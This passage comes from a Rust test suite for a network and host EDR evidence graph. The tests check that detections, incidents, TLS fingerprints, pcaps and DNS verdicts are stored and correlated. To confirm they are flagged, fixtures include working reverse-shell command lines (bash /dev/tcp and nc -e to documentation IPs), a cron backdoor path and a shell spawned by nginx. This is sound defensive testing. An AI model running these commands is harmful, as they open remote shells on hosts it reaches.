        assert_eq!(ve["events"][1]["summary"], "Edit a.rs");

        // unknown session_key: found:false, never an error (an MCP client can probe safely).
        let missing = g.lifecycle_trace("sess-does-not-exist").unwrap();
        let vm: serde_json::Value = serde_json::from_str(&missing).unwrap();
        assert_eq!(vm["found"], false);
        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn lifecycle_trace_latest_with_no_sessions_reports_not_found() {
        let g = EvidenceGraph::open_memory().unwrap();
        let missing = g.lifecycle_trace("latest").unwrap();
        let v: serde_json::Value = serde_json::from_str(&missing).unwrap();
        assert_eq!(v["found"], false);
    }

    #[test]
    fn correlate_combines_incident_and_attack_path() {
        let g = EvidenceGraph::open_memory().unwrap();
        // rule_id 1000041 = lateral::LATERAL_RULE_ID (see doc comment on the other 1000041 fixture
        // above) — not 1000009, which is a different, real, in-use rule ("TLS Downgrade").
        g.ingest_detection("{\"ts\":100.0,\"rule_id\":1000041,\"rule_msg\":\"Lateral Movement\",\"category\":\"lateral_movement\",\"severity\":3,\"mitre\":\"T1021\",\"src_ip\":\"10.0.0.5\",\"dst_ip\":\"10.0.0.9\",\"dst_port\":445,\"confidence\":0.9}").unwrap();
        let out = g.correlate("10.0.0.5").unwrap();
        let v: serde_json::Value = serde_json::from_str(&out).expect("correlate must be valid JSON");
        assert_eq!(v["device_ip"], "10.0.0.5");
        assert!(v["incident_id"].as_str().unwrap().starts_with("inc:"));
        assert!(v["attack_path"]["node_count"].as_i64().unwrap() >= 2, "incident + detection at least");

        // re-running correlate on the same device is idempotent (correlate_incident upserts).
        let (_, _, _, e1) = g.counts().unwrap();
        g.correlate("10.0.0.5").unwrap();
        let (_, _, _, e2) = g.counts().unwrap();
        assert_eq!(e1, e2, "correlate must not duplicate edges on re-run");
    }

    // ---- F-B5: auto-correlation (hookprobe-evidence.timer's automatic pass) -----------------------

    #[test]
    fn correlate_all_finds_new_detections_and_is_idempotent_on_rerun() {
        let g = EvidenceGraph::open_memory().unwrap();
        g.ingest_detection("{\"ts\":1000.0,\"rule_id\":1,\"rule_msg\":\"x\",\"category\":\"c\",\"severity\":2,\"src_ip\":\"10.0.0.1\",\"dst_ip\":\"10.0.0.2\",\"dst_port\":22,\"confidence\":0.9}").unwrap();
        g.ingest_detection("{\"ts\":1001.0,\"rule_id\":2,\"rule_msg\":\"y\",\"category\":\"c\",\"severity\":1,\"src_ip\":\"10.0.0.5\",\"dst_ip\":\"10.0.0.6\",\"dst_port\":80,\"confidence\":0.5}").unwrap();

        let n1 = g.correlate_all(0.0).unwrap();
        assert_eq!(n1, 2, "two distinct devices with detections must be correlated");
        let incidents: i64 = g.conn.query_row("SELECT count(*) FROM incidents", [], |r| r.get(0)).unwrap();
        assert_eq!(incidents, 2);

        // re-run with no new detections since the watermark: zero new work — idempotent.
        let n2 = g.correlate_all(0.0).unwrap();
        assert_eq!(n2, 0, "no new detections since the watermark -> nothing to correlate");
        let incidents2: i64 = g.conn.query_row("SELECT count(*) FROM incidents", [], |r| r.get(0)).unwrap();
        assert_eq!(incidents2, 2, "re-run must not duplicate or lose incidents");

        // a NEW detection past the watermark IS picked up on the next pass.
        g.ingest_detection("{\"ts\":2000.0,\"rule_id\":3,\"rule_msg\":\"z\",\"category\":\"c\",\"severity\":3,\"src_ip\":\"10.0.0.9\",\"dst_ip\":\"10.0.0.10\",\"dst_port\":443,\"confidence\":0.8}").unwrap();
        let n3 = g.correlate_all(0.0).unwrap();
        assert_eq!(n3, 1, "only the new device's detection should be correlated this pass");
        let incidents3: i64 = g.conn.query_row("SELECT count(*) FROM incidents", [], |r| r.get(0)).unwrap();
        assert_eq!(incidents3, 3);
    }

    #[test]
    fn correlate_all_on_empty_graph_does_nothing() {
        let g = EvidenceGraph::open_memory().unwrap();
        let n = g.correlate_all(0.0).unwrap();
        assert_eq!(n, 0);
        let incidents: i64 = g.conn.query_row("SELECT count(*) FROM incidents", [], |r| r.get(0)).unwrap();
        assert_eq!(incidents, 0);
    }

    // ---- Host-EDR: closes the "host-telemetry is observation-only" CRITICAL audit finding ----------

    #[test]
    fn host_reverse_shell_exec_becomes_a_real_detection() {
        let g = EvidenceGraph::open_memory().unwrap();
        let line = serde_json::json!({
            "type": "process", "ts": 500.0, "device_ip": "10.0.0.42", "pid": 4242,
            "name": "bash", "cmdline": "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", "parent_pid": 1
        }).to_string();
        let pnode = g.ingest_host_event(&line).unwrap().expect("process event ingests");

        let (rule_id, category, severity, mitre, src_ip): (i64, String, i64, String, String) = g.conn.query_row(
            "SELECT rule_id, category, severity, mitre, src_ip FROM detections WHERE rule_id=?",
            params![host_edr::REVERSE_SHELL_RULE_ID],
            |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?, r.get(4)?)),
        ).expect("a reverse-shell exec must produce a detection row");
        assert_eq!(rule_id, host_edr::REVERSE_SHELL_RULE_ID);
        assert_eq!(category, "host_reverse_shell");
        assert_eq!(severity, 1, "CRITICAL");
        assert_eq!(mitre, "T1059.004");
        assert_eq!(src_ip, "10.0.0.42", "src_ip = the device that executed it");

        // evidence chained to the specific process node (not just the device).
        let det_id: String = g.conn.query_row(
            "SELECT id FROM detections WHERE rule_id=?", params![host_edr::REVERSE_SHELL_RULE_ID], |r| r.get(0)).unwrap();
        let chained: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type='detection_on_process' AND dst_id=?",
            params![det_id, pnode], |r| r.get(0)).unwrap();
        assert_eq!(chained, 1, "the detection must chain to the exact process node that triggered it");
        let on_device: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type='detects_on_device'", params![det_id], |r| r.get(0)).unwrap();
        assert_eq!(on_device, 1);
    }

    #[test]
    fn benign_exec_produces_no_detection() {
        let g = EvidenceGraph::open_memory().unwrap();
        let line = serde_json::json!({
            "type": "process", "ts": 500.0, "device_ip": "10.0.0.42", "pid": 100,
            "name": "vim", "cmdline": "/usr/bin/vim notes.txt", "parent_pid": 1
        }).to_string();
        g.ingest_host_event(&line).unwrap().expect("process event still ingests as a node");
        let dets: i64 = g.conn.query_row("SELECT count(*) FROM detections", [], |r| r.get(0)).unwrap();
        assert_eq!(dets, 0, "a benign exec must not fabricate a detection");
    }

    #[test]
    fn suspicious_daemon_parentage_needs_the_parents_exec_event_first() {
        // The parent-name lookup queries the ALREADY-ingested `processes` row for ppid — so the
        // parent's own exec event must land first (the real ordering execsnoop/host-telemetry
        // produces: parent forks before the child execs).
        let g = EvidenceGraph::open_memory().unwrap();
        g.ingest_host_event(&serde_json::json!({
            "type": "process", "ts": 100.0, "device_ip": "10.0.0.7", "pid": 900,
            "name": "nginx", "cmdline": "nginx: worker process", "parent_pid": 1
        }).to_string()).unwrap();
        g.ingest_host_event(&serde_json::json!({
            "type": "process", "ts": 101.0, "device_ip": "10.0.0.7", "pid": 901,
            "name": "sh", "cmdline": "/bin/sh -c id", "parent_pid": 900
        }).to_string()).unwrap();

        let n: i64 = g.conn.query_row(
            "SELECT count(*) FROM detections WHERE rule_id=?",
            params![host_edr::SUSPICIOUS_PARENTAGE_RULE_ID], |r| r.get(0)).unwrap();
        assert_eq!(n, 1, "nginx spawning a shell must be flagged once the parent's exec is known");
    }

    #[test]
    fn persistence_path_write_becomes_a_detection() {
        let g = EvidenceGraph::open_memory().unwrap();
        let line = serde_json::json!({
            "type": "file", "ts": 700.0, "device_ip": "10.0.0.9", "path": "/etc/cron.d/backdoor",
            "action": "write", "pid": 555,
        }).to_string();
        let fnode = g.ingest_host_event(&line).unwrap().expect("file event ingests");

        let (rule_id, category, mitre): (i64, String, String) = g.conn.query_row(
            "SELECT rule_id, category, mitre FROM detections WHERE rule_id=?",
            params![host_edr::CRON_PERSISTENCE_RULE_ID],
            |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?)),
        ).expect("a cron persistence write must produce a detection row");
        assert_eq!(rule_id, host_edr::CRON_PERSISTENCE_RULE_ID);
        assert_eq!(category, "host_persistence_cron");
        assert_eq!(mitre, "T1053.003");

        let det_id: String = g.conn.query_row(
            "SELECT id FROM detections WHERE rule_id=?", params![host_edr::CRON_PERSISTENCE_RULE_ID], |r| r.get(0)).unwrap();
        let chained: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type='detection_on_file' AND dst_id=?",
            params![det_id, fnode], |r| r.get(0)).unwrap();
        assert_eq!(chained, 1);
    }

    // ---- 2026-07-09 file-hash IOC wiring (ADR 0027 follow-up: `hookprobe_hydra::matcher::match_hash`
    // goes from type-complete-but-dead to a LIVE path) ------------------------------------------

    #[test]
    fn file_write_with_sha256_persists_the_hash_and_ioc_file_candidates_serves_it() {
        let g = EvidenceGraph::open_memory().unwrap();
        let line = serde_json::json!({
            "type": "file", "ts": 800.0, "device_ip": "10.0.0.9", "path": "/tmp/.hidden/payload",
            "action": "write", "pid": 42,
            "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f", // the EICAR canary
        }).to_string();
        let fnode = g.ingest_host_event(&line).unwrap().expect("file event ingests");

        let stored: String = g.conn.query_row(
            "SELECT sha256 FROM files WHERE id=?", params![fnode], |r| r.get(0)).unwrap();
        assert_eq!(stored, "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f");

        let candidates_json = g.ioc_file_candidates(100).unwrap();
        let v: serde_json::Value = serde_json::from_str(&candidates_json).unwrap();
        let arr = v.as_array().unwrap();
        assert_eq!(arr.len(), 1);
        assert_eq!(arr[0]["device_ip"], "10.0.0.9");
        assert_eq!(arr[0]["sha256"], "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f");

        // the watermark must have advanced — a second call with nothing new returns empty.
        let second: serde_json::Value = serde_json::from_str(&g.ioc_file_candidates(100).unwrap()).unwrap();
        assert!(second.as_array().unwrap().is_empty(), "watermark must advance so a re-run doesn't re-serve the same file event");
    }

    #[test]
    fn file_event_without_sha256_is_never_served_as_an_ioc_file_candidate() {
        let g = EvidenceGraph::open_memory().unwrap();
        // a normal file write with no hash computed (e.g. oversized — see hookprobe-fanotify's own
        // size-cap doc) must never surface as a hash-match candidate (an empty sha256 must never be
        // treated as "a file whose hash happens to be the empty string").
        let line = serde_json::json!({
            "type": "file", "ts": 800.0, "device_ip": "10.0.0.9", "path": "/home/user/notes.txt",
            "action": "write", "pid": 42,
        }).to_string();
        g.ingest_host_event(&line).unwrap();
        let v: serde_json::Value = serde_json::from_str(&g.ioc_file_candidates(100).unwrap()).unwrap();
        assert!(v.as_array().unwrap().is_empty());
    }

    #[test]
    fn a_later_file_event_can_backfill_the_hash_a_hashless_earlier_sighting_lacked() {
        let g = EvidenceGraph::open_memory().unwrap();
        let dev = "10.0.0.9";
        let path = "/tmp/dropped";
        g.ingest_host_event(&serde_json::json!({
            "type": "file", "ts": 700.0, "device_ip": dev, "path": path, "action": "write", "pid": 1,
        }).to_string()).unwrap();
        let fnode = g.ingest_host_event(&serde_json::json!({
            "type": "file", "ts": 701.0, "device_ip": dev, "path": path, "action": "write", "pid": 1,
            "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        }).to_string()).unwrap().unwrap();
        let stored: String = g.conn.query_row(
            "SELECT sha256 FROM files WHERE id=?", params![fnode], |r| r.get(0)).unwrap();
        assert_eq!(stored, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
    }

    // ---- 2026-07-09 JA4/JA4S/JA4H flow-record wiring -------------------------------------------

    #[test]
    fn ingest_flow_persists_ja4_alongside_ja3_and_ioc_flow_candidates_serves_both() {
        let g = EvidenceGraph::open_memory().unwrap();
        let line = serde_json::json!({
            "type": "tls", "ts": 900.0, "src_ip": "10.66.0.5", "src_port": 51000,
            "dst_ip": "203.0.113.9", "dst_port": 443, "proto": "tcp", "service": "tls",
            "tls_sni": "evil-c2.example", "ja3": "e7d705a3286e19ea42f587b344ee6865",
            "ja4": "t13d0204h2_62ed6f6ca7ad_3953dc75acc4",
        }).to_string();
        g.ingest_flow(&line).unwrap();

        let (ja3, ja4): (String, String) = g.conn.query_row(
            "SELECT ja3, ja4 FROM applications WHERE sni=?", params!["evil-c2.example"],
            |r| Ok((r.get(0)?, r.get(1)?))).unwrap();
        assert_eq!(ja3, "e7d705a3286e19ea42f587b344ee6865");
        assert_eq!(ja4, "t13d0204h2_62ed6f6ca7ad_3953dc75acc4");

        let v: serde_json::Value = serde_json::from_str(&g.ioc_flow_candidates(100).unwrap()).unwrap();
        let arr = v.as_array().unwrap();
        assert_eq!(arr.len(), 1);
        assert_eq!(arr[0]["ja3"], "e7d705a3286e19ea42f587b344ee6865");
        assert_eq!(arr[0]["ja4"], "t13d0204h2_62ed6f6ca7ad_3953dc75acc4");
    }

    #[test]
    fn ingest_flow_persists_ja4s_on_its_own_server_hello_record() {
        let g = EvidenceGraph::open_memory().unwrap();
        // a ServerHello record carries no sni/http_host of its own — it lands in the documented
        // service+port fallback bucket (see ingest_flow's own doc comment on this preference order).
        let line = serde_json::json!({
            "type": "tls", "ts": 900.0, "src_ip": "10.66.0.5", "src_port": 51000,
            "dst_ip": "203.0.113.9", "dst_port": 443, "proto": "tcp", "service": "tls",
            "ja4s": "t1303h2_1302_02a34fb8a812",
        }).to_string();
        g.ingest_flow(&line).unwrap();

        let ja4s: String = g.conn.query_row(
            "SELECT ja4s FROM applications WHERE service='tls' AND dst_port=443", [],
            |r| r.get(0)).unwrap();
        assert_eq!(ja4s, "t1303h2_1302_02a34fb8a812");
    }

    #[test]
    fn ingest_flow_persists_ja4h_and_list_flows_surfaces_it() {
        // audit GAP-3/GAP-7: ja4h was persisted but had NO read consumer and NO test. An HTTP
        // (port-80) flow carries ja4h + http_host; assert it round-trips to `applications` AND that
        // list_flows (the /api/flows read path this fix wired) actually returns it.
        let g = EvidenceGraph::open_memory().unwrap();
        let line = serde_json::json!({
            "type": "http", "ts": 900.0, "src_ip": "10.66.0.5", "src_port": 51000,
            "dst_ip": "203.0.113.9", "dst_port": 80, "proto": "tcp", "service": "http",
            "http_host": "curl-ish.example",
            "ja4h": "ge11cr03enus_295e410d3834_1eb7c54d5283_06beefe2b477",
        }).to_string();
        g.ingest_flow(&line).unwrap();

        let ja4h: String = g.conn.query_row(
            "SELECT ja4h FROM applications WHERE http_host=?", params!["curl-ish.example"],
            |r| r.get(0)).unwrap();
        assert_eq!(ja4h, "ge11cr03enus_295e410d3834_1eb7c54d5283_06beefe2b477");

        // the read consumer that closes the write-only dead-end: list_flows must expose ja4h.
        let v: serde_json::Value = serde_json::from_str(&g.list_flows(100).unwrap()).unwrap();
        let flows = v["flows"].as_array().unwrap();
        assert_eq!(flows.len(), 1);
        assert_eq!(flows[0]["ja4h"], "ge11cr03enus_295e410d3834_1eb7c54d5283_06beefe2b477");
    }

    // ---- Trigger-to-evidence pcap capture (roadmap D) — evidence-graph linkage + retention -------

    #[test]
    fn ingest_detection_persists_a_pcaps_row_and_detection_to_pcap_edge() {
        let g = EvidenceGraph::open_memory().unwrap();
        let line = serde_json::json!({
            "ts": 1782900000.5, "rule_id": 1000003, "rule_msg": "NAPSE Port Scan Detected",
            "category": "port_scan", "severity": 3, "mitre": "T1046",
            "src_ip": "203.0.113.50", "dst_ip": "10.0.0.1", "dst_port": 22, "confidence": 0.75,
            "confirmed": true,
            "pcap_path": "/var/lib/hookprobe/pcap/1000003-1782900000500-203-0-113-50-1.pcap",
            "pcap_sha256": "abc123def456",
            "pcap_bytes": 4096,
            "pcap_first_ts": 1782899995.0,
            "pcap_last_ts": 1782900005.0,
        }).to_string();
        let det_id = g.ingest_detection(&line).unwrap().expect("detection ingested");

        let (path, sha256, bytes, src_ip, first_ts, last_ts): (String, String, i64, String, f64, f64) =
            g.conn.query_row(
                "SELECT path, sha256, bytes, src_ip, first_ts, last_ts FROM pcaps",
                [], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?, r.get(4)?, r.get(5)?)),
            ).unwrap();
        assert_eq!(path, "/var/lib/hookprobe/pcap/1000003-1782900000500-203-0-113-50-1.pcap");
        assert_eq!(sha256, "abc123def456");
        assert_eq!(bytes, 4096);
        assert_eq!(src_ip, "203.0.113.50");
        assert_eq!(first_ts, 1782899995.0);
        assert_eq!(last_ts, 1782900005.0);

        let pcap_id = sid("pcap", &path);
        let edge_count: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=?1 AND edge_type=?2 AND dst_id=?3",
            params![det_id, EDGE_DETECTION_TO_PCAP, pcap_id], |r| r.get(0),
        ).unwrap();
        assert_eq!(edge_count, 1, "detection_to_pcap edge must link the detection to its pcap");
    }

    #[test]
    fn ingest_detection_without_a_pcap_ref_creates_no_pcaps_row() {
        // The honest common case (most detections have none — see `napse_loader::capture`'s
        // module doc's "What this is NOT" section): no pcap_path field, no pcaps row, no edge.
        let g = EvidenceGraph::open_memory().unwrap();
        let line = serde_json::json!({
            "ts": 900.0, "rule_id": 1000041, "rule_msg": "NAPSE Lateral Movement Detected",
            "category": "lateral_movement", "severity": 2, "mitre": "T1021",
            "src_ip": "10.0.0.9", "dst_ip": "10.0.0.10", "dst_port": 445, "confidence": 0.7,
        }).to_string();
        g.ingest_detection(&line).unwrap();
        let count: i64 = g.conn.query_row("SELECT count(*) FROM pcaps", [], |r| r.get(0)).unwrap();
        assert_eq!(count, 0);
    }

    #[test]
    fn ingest_detection_pcap_ref_is_idempotent_on_re_ingest() {
        let g = EvidenceGraph::open_memory().unwrap();
        let line = serde_json::json!({
            "ts": 900.0, "rule_id": 1000003, "rule_msg": "NAPSE Port Scan Detected",
            "category": "port_scan", "severity": 3, "mitre": "T1046",
            "src_ip": "10.0.0.9", "dst_ip": "10.0.0.1", "dst_port": 22, "confidence": 0.7,
            "pcap_path": "/var/lib/hookprobe/pcap/x.pcap", "pcap_sha256": "aaa", "pcap_bytes": 10,
        }).to_string();
        g.ingest_detection(&line).unwrap();
        g.ingest_detection(&line).unwrap(); // simulate hookprobe-evidence.timer re-scanning the file
        let count: i64 = g.conn.query_row("SELECT count(*) FROM pcaps", [], |r| r.get(0)).unwrap();
        assert_eq!(count, 1, "re-ingesting the same events line must not duplicate the pcaps row");
    }

    #[test]
    fn trace_detection_surfaces_its_linked_pcap() {
        let g = EvidenceGraph::open_memory().unwrap();
        let line = serde_json::json!({
            "ts": 900.0, "rule_id": 1000003, "rule_msg": "NAPSE Port Scan Detected",
            "category": "port_scan", "severity": 3, "mitre": "T1046",
            "src_ip": "10.0.0.9", "dst_ip": "10.0.0.1", "dst_port": 22, "confidence": 0.7,
            "pcap_path": "/var/lib/hookprobe/pcap/x.pcap", "pcap_sha256": "aaa", "pcap_bytes": 10,
            "pcap_first_ts": 899.0, "pcap_last_ts": 901.0,
        }).to_string();
        let det_id = g.ingest_detection(&line).unwrap().unwrap();
        let v: serde_json::Value = serde_json::from_str(&g.trace_detection(&det_id).unwrap()).unwrap();
        let pcaps = v["pcaps"].as_array().unwrap();
        assert_eq!(pcaps.len(), 1);
        assert_eq!(pcaps[0]["path"], "/var/lib/hookprobe/pcap/x.pcap");
        assert_eq!(pcaps[0]["sha256"], "aaa");
        assert_eq!(pcaps[0]["bytes"], 10);
    }

    #[test]
    fn list_pcaps_returns_most_recent_first_with_its_owning_detection() {
        let g = EvidenceGraph::open_memory().unwrap();
        for (i, ts) in [100.0, 200.0, 300.0].into_iter().enumerate() {
            let line = serde_json::json!({
                "ts": ts, "rule_id": 1000003, "rule_msg": "NAPSE Port Scan Detected",
                "category": "port_scan", "severity": 3, "mitre": "T1046",
                "src_ip": format!("10.0.0.{}", i), "dst_ip": "10.0.0.1", "dst_port": 22, "confidence": 0.7,
                "pcap_path": format!("/var/lib/hookprobe/pcap/{i}.pcap"), "pcap_sha256": "x", "pcap_bytes": 1,
            }).to_string();
            g.ingest_detection(&line).unwrap();
        }
        let v: serde_json::Value = serde_json::from_str(&g.list_pcaps(100).unwrap()).unwrap();
        let rows = v["pcaps"].as_array().unwrap();
        assert_eq!(rows.len(), 3);
        assert_eq!(rows[0]["path"], "/var/lib/hookprobe/pcap/2.pcap", "most recent (ts=300) first");
        assert_eq!(rows[0]["rule_id"], 1000003);
        assert_eq!(rows[0]["category"], "port_scan");
    }

    #[test]
    fn prune_pcap_dir_evicts_files_older_than_the_age_window_regardless_of_size() {
        let g = EvidenceGraph::open_memory().unwrap();
        let dir = std::env::temp_dir().join(format!("hp-evidence-pcaptest-age-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let old_path = dir.join("old.pcap");
        let new_path = dir.join("new.pcap");
        std::fs::write(&old_path, [0u8; 100]).unwrap();
        std::fs::write(&new_path, [0u8; 100]).unwrap();
        let now = now_ts();
        // ids MUST match `sid("pcap", path)` exactly — that's what `prune_pcap_dir` itself
        // computes to key its DELETE, mirroring how `ingest_detection` mints them for real.
        let old_id = sid("pcap", &old_path.to_string_lossy());
        let new_id = sid("pcap", &new_path.to_string_lossy());
        // an "old" pcap row 48h in the past; a "new" one 1 minute ago.
        g.conn.execute(
            "INSERT INTO pcaps VALUES (?,?,?,?,?,?,?,?)",
            params![old_id, now - 172_800.0, old_path.to_string_lossy(), "x", 100i64, "10.0.0.1", now - 172_800.0, now - 172_800.0],
        ).unwrap();
        g.conn.execute(
            "INSERT INTO pcaps VALUES (?,?,?,?,?,?,?,?)",
            params![new_id, now - 60.0, new_path.to_string_lossy(), "y", 100i64, "10.0.0.2", now - 60.0, now - 60.0],
        ).unwrap();

        // huge cap (size is never the limiting factor here) — only the 24h age window should evict.
        let stats = g.prune_pcap_dir(&dir, 1_000_000_000, 24.0 * 3600.0).unwrap();
        assert_eq!(stats.deleted_files, 1);
        assert!(!old_path.exists(), "the 48h-old pcap must be evicted by the age window");
        assert!(new_path.exists(), "the 1-minute-old pcap must survive");
        let remaining: i64 = g.conn.query_row("SELECT count(*) FROM pcaps", [], |r| r.get(0)).unwrap();
        assert_eq!(remaining, 1);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn prune_pcap_dir_evicts_oldest_first_under_the_size_cap_and_removes_its_row_and_edges() {
        let g = EvidenceGraph::open_memory().unwrap();
        let dir = std::env::temp_dir().join(format!("hp-evidence-pcaptest-size-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let now = now_ts();
        let mut paths = Vec::new();
        for i in 0..4u8 {
            let p = dir.join(format!("f{i}.pcap"));
            std::fs::write(&p, vec![0u8; 100]).unwrap();
            let ts = now - (10.0 - i as f64); // f0 oldest .. f3 newest, all well within the age window
            let pcap_id = sid("pcap", &p.to_string_lossy());
            g.conn.execute(
                "INSERT INTO pcaps VALUES (?,?,?,?,?,?,?,?)",
                params![pcap_id, ts, p.to_string_lossy(), "x", 100i64, "10.0.0.1", ts, ts],
            ).unwrap();
            // a fake owning detection + edge, to prove the edge cascade fires too.
            let det_id = format!("det:fake{i}");
            g.conn.execute("INSERT INTO detections VALUES (?,?,?,?,?,?,?,?,?,?,?)",
                params![det_id, ts, 1000003i64, "x", "port_scan", 3i64, "T1046", "10.0.0.1", "10.0.0.9", 22i64, 0.5]).unwrap();
            g.add_edge(&det_id, EDGE_DETECTION_TO_PCAP, &pcap_id, ts).unwrap();
            paths.push(p);
        }
        // total on-disk = 400 bytes; cap at 250 -> oldest-first eviction until <= 250 (2 files gone).
        let stats = g.prune_pcap_dir(&dir, 250, 24.0 * 3600.0).unwrap();
        assert_eq!(stats.deleted_files, 2);
        assert!(!paths[0].exists(), "f0 (oldest) must be evicted first");
        assert!(!paths[1].exists(), "f1 (2nd oldest) must be evicted next");
        assert!(paths[2].exists());
        assert!(paths[3].exists());
        let remaining_rows: i64 = g.conn.query_row("SELECT count(*) FROM pcaps", [], |r| r.get(0)).unwrap();
        assert_eq!(remaining_rows, 2);
        let remaining_edges: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE edge_type=?1", params![EDGE_DETECTION_TO_PCAP], |r| r.get(0),
        ).unwrap();
        assert_eq!(remaining_edges, 2, "the evicted pcaps' detection_to_pcap edges must be removed too");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn prune_pcap_dir_on_a_missing_directory_is_an_honest_no_op() {
        let g = EvidenceGraph::open_memory().unwrap();
        let dir = std::env::temp_dir().join("hp-evidence-pcaptest-does-not-exist-at-all");
        let _ = std::fs::remove_dir_all(&dir);
        let stats = g.prune_pcap_dir(&dir, 100, 3600.0).unwrap();
        assert_eq!(stats.deleted_files, 0);
        assert_eq!(stats.size_before_bytes, 0);
    }

    #[test]
    fn benign_file_write_produces_no_detection() {
        let g = EvidenceGraph::open_memory().unwrap();
        let line = serde_json::json!({
            "type": "file", "ts": 700.0, "device_ip": "10.0.0.9", "path": "/home/user/notes.txt",
            "action": "write", "pid": 555,
        }).to_string();
        g.ingest_host_event(&line).unwrap();
        let dets: i64 = g.conn.query_row("SELECT count(*) FROM detections", [], |r| r.get(0)).unwrap();
        assert_eq!(dets, 0);
    }

    #[test]
    fn host_detection_correlates_into_an_incident_via_correlate_all() {
        let g = EvidenceGraph::open_memory().unwrap();
        // a host-EDR reverse-shell exec on a device with NO network detections at all.
        g.ingest_host_event(&serde_json::json!({
            "type": "process", "ts": 800.0, "device_ip": "10.0.0.66", "pid": 77,
            "name": "nc", "cmdline": "nc -e /bin/sh 203.0.113.5 4444", "parent_pid": 1
        }).to_string()).unwrap();

        let n = g.correlate_all(0.0).unwrap();
        assert_eq!(n, 1, "the host detection's device must be auto-correlated");
        let (device_ip, title): (String, String) = g.conn.query_row(
            "SELECT device_ip, title FROM incidents", [], |r| Ok((r.get(0)?, r.get(1)?))).unwrap();
        assert_eq!(device_ip, "10.0.0.66");
        assert!(title.contains("10.0.0.66"));

        // the incident's attack path must reach the process node the detection fired on.
        let inc_id: String = g.conn.query_row("SELECT id FROM incidents", [], |r| r.get(0)).unwrap();
        let path = g.attack_path(&inc_id).unwrap();
        assert!(path.contains("process_on_device"), "attack path must span into the host layer");
    }

    // ---- F-B6: orphaned engine outputs (dnsxai / aegis-guard / qsecbit) ---------------------------

    #[test]
    fn ingest_dns_verdict_skips_benign_ingests_suspicious_and_malicious_idempotently() {
        let g = EvidenceGraph::open_memory().unwrap();
        let benign = r#"{"domain":"google.com","score":0.0000,"verdict":"benign","reasons":[]}"#;
        assert!(g.ingest_dns_verdict(benign).unwrap().is_none(), "benign is not evidence-worthy");

        let suspicious = r#"{"domain":"kq3v9z7x1p2w.com","score":0.5500,"verdict":"suspicious","reasons":["very_low_vowels:0.00","high_digit_ratio:0.42"]}"#;
        let det_id = g.ingest_dns_verdict(suspicious).unwrap().expect("suspicious verdict must ingest");
        let (category, severity, confidence, rule_msg): (String, i64, f64, String) = g.conn.query_row(
            "SELECT category, severity, confidence, rule_msg FROM detections WHERE id=?", params![det_id],
            |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?))).unwrap();
        assert_eq!(category, "dns_dga");
        assert_eq!(severity, SEV_MEDIUM, "suspicious = MEDIUM on the canonical 1=CRITICAL scale");
        assert!((confidence - 0.55).abs() < 1e-9);
        assert!(rule_msg.contains("kq3v9z7x1p2w.com") && rule_msg.contains("high_digit_ratio"));

        let malicious = r#"{"domain":"evil-c2.example","score":0.9000,"verdict":"malicious","reasons":["known_tld_abuse"]}"#;
        let det_id2 = g.ingest_dns_verdict(malicious).unwrap().expect("malicious verdict must ingest");
        let severity2: i64 = g.conn.query_row(
            "SELECT severity FROM detections WHERE id=?", params![det_id2], |r| r.get(0)).unwrap();
        assert_eq!(severity2, 2, "malicious must outrank suspicious");

        // idempotent re-ingest: deterministic content-based id, no duplicate row.
        g.ingest_dns_verdict(suspicious).unwrap();
        let n: i64 = g.conn.query_row("SELECT count(*) FROM detections", [], |r| r.get(0)).unwrap();
        assert_eq!(n, 2, "re-ingesting the same suspicious line must not duplicate it");
    }

    /// EDR audit finding #10: once the dnsxai verdict carries `src_ip` (the requesting device), the
    /// evidence side must create the `detects_on_device` edge — and gracefully degrade (no edge, no
    /// error) on the older feed contract that carries no `src_ip` at all.
    #[test]
    fn ingest_dns_verdict_with_src_ip_links_detects_on_device_and_degrades_gracefully_without_it() {
        let g = EvidenceGraph::open_memory().unwrap();

        // new feed contract: src_ip present -> detects_on_device edge + a devices row for it.
        let with_src = r#"{"domain":"kq3v9z7x1p2w.com","score":0.55,"verdict":"suspicious","reasons":["low_vowels"],"src_ip":"10.0.0.23"}"#;
        let det_id = g.ingest_dns_verdict(with_src).unwrap().expect("must ingest");
        let src_ip_col: String = g.conn.query_row(
            "SELECT src_ip FROM detections WHERE id=?", params![det_id], |r| r.get(0)).unwrap();
        assert_eq!(src_ip_col, "10.0.0.23");
        let edge_n: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type='detects_on_device'", params![det_id], |r| r.get(0)).unwrap();
        assert_eq!(edge_n, 1, "src_ip present -> detects_on_device edge must exist");
        let dev_n: i64 = g.conn.query_row(
            "SELECT count(*) FROM devices WHERE ip='10.0.0.23'", [], |r| r.get(0)).unwrap();
        assert_eq!(dev_n, 1, "the requesting device must get a node even with no prior flow");

        // old feed contract: no src_ip -> ingests exactly as before (no edge, no error, no device).
        let without_src = r#"{"domain":"evil-c2.example","score":0.9,"verdict":"malicious","reasons":["known_tld_abuse"]}"#;
        let det_id2 = g.ingest_dns_verdict(without_src).unwrap().expect("must still ingest");
        let src_ip_col2: String = g.conn.query_row(
